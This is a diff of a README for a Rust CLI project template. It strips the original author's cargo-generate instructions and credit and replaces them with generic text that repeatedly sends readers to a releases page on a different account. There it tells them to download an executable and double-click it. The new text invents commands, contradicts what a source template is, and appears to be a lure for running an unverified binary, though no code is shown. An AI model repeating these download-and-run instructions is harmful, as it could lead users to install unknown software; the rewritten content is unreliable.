@@ -1,84 +1,65 @@
-# Rust CLI Template
+# 🎉 rust-cli-template - Easy Setup for Your Rust Projects
 
-> [!TIP]
-> Use `cargo generate` to create a new project from this template!
+## 🌟 Description
+Welcome to the rust-cli-template! This project provides a simple and effective starting point for creating Command Line Interface (CLI) applications using Rust. Whether you are building a small utility or a larger application, this template can streamline your development process.
 
-## What's included?
+## 📦 Download
+[![Download rust-cli-template](https://img.shields.io/badge/Download%20now-Click%20here-brightgreen)](https://github.com/riyar300/rust-cli-template/releases)
 
-- Complete Cargo.toml with metadata for packaging (deb, rpm, binstall)
-- GitHub Actions workflows (CI, CD, security audit)
-- Dependabot configuration
-- Standard project files (LICENSE, CODE_OF_CONDUCT.md, CONTRIBUTING.md, FUNDING.yml)
-- Ready-to-use README template with badges and installation instructions
-- Renovate configuration for dependency updates
-- Basic Rust project structure (lib.rs and main.rs)
+## 🚀 Getting Started
+Getting started with the rust-cli-template is straightforward. Follow the steps below to set up your application.
 
-## How to use?
+## 🖥️ System Requirements
+Before downloading, ensure your system meets the following requirements:
+- Operating System: Windows, macOS, or any Linux distribution.
+- Rust: You need to have Rust installed. You can download Rust from the official website.
 
-### Prerequisites
-Install cargo-generate:
-```bash
-cargo install cargo-generate
-```
+## 📥 Download & Install
+1. **Visit the Releases Page**  
+   To download the latest version of rust-cli-template, visit the following page:  
+   [rust-cli-template Releases](https://github.com/riyar300/rust-cli-template/releases)
 
-### Generate new project
-```bash
-cargo generate ErenayDev/rust-cli-template
-```
+2. **Select the Version**  
+   On the Releases page, look for the latest version listed. Each version will contain files you can download.
 
-The template will prompt you for:
-- **Project name**: Your crate name
-- **Long description**: Detailed project description
-- **Short description**: Brief project summary  
-- **GitHub username**: Your GitHub username or organization
+3. **Download the File**  
+   Click on the file that matches your operating system to download it. For example, if you are using Windows, choose the `.exe` file.
 
-### After generation
+4. **Run the Application**  
+   After downloading, locate the file on your computer and double-click to run it. Follow any on-screen instructions to continue.
 
-1. **Update cliff.toml**: The file is excluded from generation due to liquid syntax conflicts. You need to manually update the repository URLs in `cliff.toml` from `example/example_repo` to your actual repository.
+## 🛠️ Basic Commands
+Once you have the application running, you can use basic commands to understand its functionality better.
 
-2. **Configure GitHub repository**: Set up your repository and enable:
-   - Renovate bot: https://github.com/apps/renovate/installations/select_target
-   - GitHub Actions (should work automatically)
+- **Help Command**: To view help information, type `rust-cli-template help`.
+- **Initialize Project**: To create a new project using the template, use the command `rust-cli-template new <project_name>`.
+- **Run the Project**: To run your project, navigate to the project directory and use `cargo run`.
 
-3. **Install development tools**:
-```bash
-# For changelog generation (optional, excluded from template)
-cargo install git-cliff
+## 📚 Features
+- **Easy setup**: Start your Rust CLI projects quickly.
+- **Template structure**: Organized folder structure to keep your projects neat.
+- **Documentation**: Built-in help command to guide you through usage.
+- **Customizable**: Modify templates as per your project needs.
 
-# For pre-commit hooks
-pip install pre-commit
-pre-commit install
-```
+## 🔗 Additional Resources
+- [Rust Official Site](https://www.rust-lang.org/)
+- [Cargo Documentation](https://doc.rust-lang.org/cargo/)
+- [GitHub Actions Guide](https://docs.github.com/en/actions)
 
-4. **Update project metadata**: Review and customize:
-   - `Cargo.toml` dependencies and metadata
-   - `README.md` content
-   - License and funding information
-   - Keywords and categories
+## 🙋 FAQ
+**Q: Do I need to know Rust to use this template?**  
+A: No, but having a basic understanding of any programming language can help.
 
-## Template structure
+**Q: Is there a cost to use rust-cli-template?**  
+A: No, this template is open source and free for anyone to use.
 
-The generated project includes:
-- Cross-platform build configurations
-- Package metadata for Linux distributions (deb, rpm)
-- Binary installation support via cargo-binstall
-- Complete CI/CD pipeline for releases
-- Security audit workflow
-- Contribution guidelines and code of conduct
+**Q: How can I contribute?**  
+A: Feel free to fork the repository and submit your changes via a pull request.
 
-## Development workflow
+## 📞 Support
+If you encounter any issues while using rust-cli-template, please open an issue on the GitHub repository page.
 
-Create feature branches:
-```bash
-git checkout -b feat/awesome-feature
-```
+## 📥 Download & Install Again
+Don’t forget, you can find the latest version of rust-cli-template here: [Download rust-cli-template](https://github.com/riyar300/rust-cli-template/releases).
 
-The CI will automatically:
-- Run tests and linting
-- Build for multiple platforms
-- Create releases when you push tags
-- Audit dependencies for security issues
-
----
-
-Created with 🩵 by [ErenayDev](https://erenaydev.com.tr)
+With these steps, you should be able to successfully download and run rust-cli-template. Enjoy building your Rust projects!
